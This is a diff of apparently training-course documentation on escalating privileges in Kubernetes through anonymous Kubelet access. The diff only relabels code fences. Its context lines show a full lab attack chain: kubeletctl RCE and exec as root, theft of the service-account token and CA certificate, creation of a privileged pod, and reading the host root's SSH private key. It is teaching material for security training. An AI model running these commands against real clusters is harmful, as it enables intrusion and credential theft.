@@ -33,7 +33,7 @@ In Kubernetes, the `Kubelet` can be configured to permit `anonymous access`. By 
 
 ### K8's API Server Interaction
 
-```sh
+```shellsession
 $ curl https://10.129.10.11:6443 -k
 
 {
@@ -51,7 +51,7 @@ $ curl https://10.129.10.11:6443 -k
 
 ### Kubelet API - Extracting Pods
 
-```sh
+```shellsession
 $ curl https://10.129.10.11:10250/pods -k | jq .
 
 ...SNIP...
@@ -99,7 +99,7 @@ $ curl https://10.129.10.11:10250/pods -k | jq .
 
 ### Kubeletctl - Extracting Pods
 
-```sh
+```shellsession
 $ kubeletctl -i --server 10.129.10.11 pods
 
 ┌────────────────────────────────────────────────────────────────────────────────┐
@@ -120,7 +120,7 @@ $ kubeletctl -i --server 10.129.10.11 pods
 
 ### Kubelet API - Scan RCE
 
-```sh
+```shellsession
 $ kubeletctl -i --server 10.129.10.11 scan rce
 
 ┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
@@ -138,7 +138,7 @@ $ kubeletctl -i --server 10.129.10.11 scan rce
 
 ### Kubelet API - Executing Commands
 
-```sh
+```shellsession
 $ kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
 
 uid=0(root) gid=0(root) groups=0(root)
@@ -149,7 +149,7 @@ To gain higher privileges and access the host system, we can utilize a tool call
 
 ### Kubelet API - Extracting Tokens
 
-```sh
+```shellsession
 $ kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
 
 eyJhbGciOiJSUzI1NiIsImtpZC...SNIP...UfT3OKQH6Sdw
@@ -157,7 +157,7 @@ eyJhbGciOiJSUzI1NiIsImtpZC...SNIP...UfT3OKQH6Sdw
 
 ### Kubelet API - Extracting Certificates
 
-```sh
+```shellsession
 $ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
 
 -----BEGIN CERTIFICATE-----
@@ -170,7 +170,7 @@ MhxgN4lKI0zpxFBTpIwJ3iZemSfh3pY2UqX03ju4TreksGMkX/hZ2NyIMrKDpolD
 
 ### List Privileges
 
-```sh
+```shellsession
 $ export token=`cat k8.token`
 $ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
 
@@ -206,7 +206,7 @@ spec:
 
 ### Creating a new Pod
 
-```sh
+```shellsession
 $ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
 
 pod/privesc created
@@ -219,7 +219,7 @@ privesc 1/1     Running 0           12s
 
 ### Extracting Root's SSH Key
 
-```sh
+```shellsession
 $ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
 
 -----BEGIN OPENSSH PRIVATE KEY-----
